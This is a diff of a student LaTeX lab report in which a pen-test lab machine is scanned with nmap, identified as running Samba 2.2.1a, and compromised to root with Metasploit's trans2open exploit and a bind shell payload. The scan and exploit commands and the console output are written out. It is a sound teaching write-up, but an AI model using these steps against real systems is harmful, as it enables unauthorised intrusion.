@@ -1,23 +1,33 @@
 \section*{Task 4: Buffer overflows}
-In the fourth task we were required to carry out an attack against another machine in the pen test lab. [Metasploit was used. Metasploit was read about at <website>]
+In the fourth task we were required to carry out an attack against another machine in the pen test lab using Metasploit.
 \begin{enumerate}
 \item % 4 (a)
-  There are three interfaces to the Metasploit Framework: a CLI, a GUI, and a console interface\cite{}. We used the console interface, which is started by issuing the command \lstinline{msfconsole} in a terminal window.
-  The first step in developing the attack on the specific host was to scan its ports for services running. This was done using the program \program{nmap} as follows: \lstinline{nmap -sS -v -A -p1-1024 192.168.2.133}. The most important part of the output is shown below.
-[Output]
-The output shows that the target machine is running (among other things) a service called Samba on port 139.
+There are three interfaces to the Metasploit Framework: a CLI, a GUI, and a console interface\cite{metasploit}. We used the console interface, which is started by issuing the command \lstinline{msfconsole} in a terminal window.
 
-In order to find a suitable vulnerability in the service, the version of Samba had to be determined. This was done by using a Samba version scanner included in the Metasploit Framework library, following the example on the website [clarify what website]. Specifically, the following three lines were entered in the console:
-\begin{itemize}
+\begin{itemize}  
+\item The first step in developing the attack on the specific host was to scan its ports for services running. This was done using the program \program{nmap} as follows:
+
+\textit{nmap -sS -v -A -p1-1024 192.168.2.133}
+
+The most important part of the output is shown below.
+  
+{\bfseries{\textit{139/tcp open netbios-ssn Samba smbd}}} 
+  
+The output shows that the target machine is running (among other things) a service called Samba on port 139.
+  
+In order to find a suitable vulnerability in the service, the version of Samba had to be determined. This was done by using a Samba version scanner included in the Metasploit Framework library, following the example on the website\cite{metasploit}. Specifically, the following three lines were entered in the console:
+\begin{enumerate}[1.]
 \item \lstinline{use auxiliary/scanner/smb/smb_version}
 \item \lstinline{set RHOSTS 192.168.2.133}
 \item \lstinline{run}
-\end{itemize}
+\end{enumerate}
 The first line selects the scanner module, the second line sets the target to be scanned to the machine that we are intending to attack, and the third line runs the scanner. The output is shown below.
-[Output]
+
+{\bfseries{\textit{[*] 192.168.2.133:139 is running Unix Samba 2.2.1a}}}
+
 The output shows that the version of the Samba service running is 2.2.1a.
 
-The next step is to search for a vulnerability and an exploit for that version of Samba. We made use of The Exploit Database (see \url{http://www.exploit-db.com}) for this. Specifically, a free-text search of ``samba 2.2.1a'' gave one hit, namely, \exploitname{Samba trans2open Overflow (Linux x86)}. Searching for trans2open in the Metasploit console then revealed the name of an exploit module for that very exploit: \msexploit{exploit/linux/samba/trans2open}.
+\item The next step is to search for a vulnerability and an exploit for that version of Samba. We made use of The Exploit Database (see \url{http://www.exploit-db.com}) for this. Specifically, a free-text search of ``samba 2.2.1a'' gave one hit, namely, \exploitname{Samba trans2open Overflow (Linux x86)}. Searching for trans2open in the Metasploit console then revealed the name of an exploit module for that very exploit: \msexploit{exploit/linux/samba/trans2open}.
 
 The following step was to carry out the attack using the exploit in Metasploit. It was done by issuing the following commands:
 \begin{enumerate}[1.]
@@ -31,9 +41,12 @@ The following step was to carry out the attack using the exploit in Metasploit. 
 The first line selects the exploit module for the \exploitname{trans2open} exploit, the second shows the options for the module. The only required option for the exploit that was empty was \option{RHOST}, which specifies the target address. The third line sets said option to \ipaddress{192.168.2.133}---the address of the target machine. The fourth line then shows the payloads available for the exploit, and the fifth line selects a payload called \payloadname{Bind TCP Inline} [explain what the payload does]. Finally, the last line executes the attack.
 
 Upon execution, the following is printed in the console.
-[Output of the attack]
-[Explanation of the output]
 
-Having achieved root access to the system, we found a text file called \filename{secret.txt} in the home folder of the root user. Its content was a marvelous piece of ASCII art with text instructing us to include the following code in the report: C14Hzd1hkNQ2w.
+{\bfseries{\textit{\lstinline{[*] Trying return address 0xbffffdfc...}\\\lstinline{Started bind handler}\\\lstinline{[*] Trying return address 0xbffffcfc...}\\\lstinline{[*] Trying return address 0xbffffbfc...}\\\lstinline{[*] Trying return address 0xbffffafc...}\\\lstinline{Sending stage (36 bytes) to 192.168.2.133}\\\lstinline{Command shell session 1 opened(10.11.12.22:38569->192.168.2.133:4444)}}}}
+
+The payload and the output will be explained in higher grade part.
+
+Having achieved root access to the system, we found a text file called \filename{secret.txt} in the home folder of the root user. Its content was a marvelous piece of ASCII art with text instructing us to include the following code in the report: {\bfseries C14Hzd1hkNQ2w}.
+\end{itemize}
 \item \highergradesonly
 \end{enumerate}
